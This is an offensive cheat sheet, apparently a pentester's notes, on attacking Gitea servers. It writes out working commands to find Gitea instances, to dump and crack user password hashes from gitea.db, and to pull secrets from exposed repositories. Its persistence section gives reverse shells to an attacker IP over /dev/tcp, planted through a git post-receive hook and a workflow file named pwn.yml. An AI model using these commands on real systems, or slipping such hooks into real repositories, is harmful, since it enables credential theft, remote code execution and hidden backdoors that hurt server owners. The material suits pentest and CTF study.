# Gitea – Self-hosted Git Service

**Gitea** is a lightweight, self-hosted Git service written in Go. It’s an open-source alternative to GitHub, GitLab, and Gogs. Due to its small footprint, it's often deployed insecurely, especially in internal dev environments, CI/CD pipelines, and small business setups.

When Gitea is exposed or compromised, attackers may gain:

- **Source code access** (including hardcoded credentials, secrets, AWS keys).
    
- **Password hashes** or plaintext credentials from a `gitea.db` SQLite database.
    
- **RCE via misconfigured webhooks or custom actions.**
    
- **User takeover** via password reset and email spoofing.
    
- **Persistence via backdoored repositories, reverse shells in CI/CD, or malicious hooks.**
    

---
## Enumeration

### Identify Gitea Running on Target

#### Look for these indicators:

- Login page at `/user/login`
    
- URL patterns like:
    
    ```
    http://$IP:3000/
    http://$IP/user/<username>
    http://$IP/api/v1/users
    ```
    

#### HTTP Headers:

```bash
curl -I http://$IP:3000
```

Example:

```
Server: Gitea
Set-Cookie: i_like_gitea=...
```

#### Nmap HTTP Title Scan

```bash
nmap -p 3000 --script http-title $IP
```

#### Check for Docker

Look for exposed Docker container info or `docker-compose.yml` for Gitea setup:

```bash
curl http://$IP:3000/.env
curl http://$IP:3000/docker-compose.yml
```

---

## Credential Extraction via SQLite

If you have access to the `gitea.db` file (e.g., through local file inclusion, volume mount, or post-exploitation), extract hashes using:

```bash
sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do \
digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); \
salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); \
name=$(echo $data | cut -d'|' -f3); \
echo "${name}:sha256:50000:${salt}:${digest}"; \
done | tee gitea.hashes
```

Hash format is compatible with `hashcat` mode `10900` (PBKDF2-HMAC-SHA256).

### Cracking with Hashcat

```bash
hashcat -m 10900 gitea.hashes /usr/share/wordlists/rockyou.txt --force
```

---

## Exploitation and Lateral Movement

### Common Misconfigurations

#### 1. **Anonymous Access to Public Repos**

```bash
curl http://$IP:3000/<org>/<repo>/raw/branch/master/.env
curl http://$IP:3000/<org>/<repo>/archive/master.zip
```

Check for:

- Hardcoded secrets, AWS creds
    
- SSH private keys
    
- DB creds
    
- JWT secrets
    
- `.gitlab-ci.yml`, `.github/workflows/`, `Dockerfile`
    

#### 2. **Open Registration + Privilege Escalation**

If registration is allowed:

1. Register a user
    
2. Try accessing `/admin` or exploiting insecure direct object references (IDOR)
    

#### 3. **Exposed Webhooks**

Look for outbound webhook definitions in:

```
http://$IP:3000/<org>/<repo>/settings/hooks
```

You may be able to inject or redirect webhooks to attacker-controlled infrastructure for SSRF or command execution in CI/CD setups.

---

## Useful SQLite Queries

### Dump All Users

```sql
SELECT id, name, passwd, email FROM user;
```

### Check Admin Users

```sql
SELECT name, is_admin FROM user WHERE is_admin=1;
```

### List All Repositories

```sql
SELECT id, name, owner_id FROM repository;
```

### Check for Webhooks

```sql
SELECT * FROM webhook;
```

---

## Persistence Techniques

### Method 1: Create New User

If you're post-auth and have admin access, create a user with access to all orgs/repos.

```bash
POST /admin/users/new
```

### Method 2: Modify Existing Repo

- Add a backdoor script into a repo
    
- Create a webhook to auto-trigger malicious actions (RCE in CI/CD)
    

### Method 3: Reverse Shell via Git Hooks (If Server-Side Exec Enabled)

1. Add `post-receive` or `post-commit` hook:
    

```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/<attacker-ip>/4444 0>&1' > .git/hooks/post-receive
chmod +x .git/hooks/post-receive
```

2. Push repo and trigger reverse shell.
    

### Method 4: Abuse Git Actions or Pipelines

Upload `.github/workflows/pwn.yml`:

```yaml
name: reverse shell
on: [push]
jobs:
  shell:
    runs-on: ubuntu-latest
    steps:
      - run: bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1
```

---

## Tooling

### `sqlite3` – Used to extract hash and user data from `gitea.db`.

### `hashcat` – Crack PBKDF2-SHA256 hashes.

```bash
hashcat -m 10900 gitea.hashes rockyou.txt
```

### `gitea-dumper` (Community Tool)

Python tool to dump all public or accessible repos:

```bash
https://github.com/HightechSec/gitea-dumper
```

### `git-dumper` – Works against Git services:

```bash
git-dumper http://$IP/<repo> /tmp/output/
```

### `subfinder`, `httpx`, `gobuster` – For discovering Gitea on unknown ports or subdomains.

---

## References

- HTB Lab Example: [https://0xdf.gitlab.io/2024/12/14/htb-compiled.html](https://0xdf.gitlab.io/2024/12/14/htb-compiled.html)
    
- Gitea Docs: [https://docs.gitea.com/installation/install-with-docker](https://docs.gitea.com/installation/install-with-docker)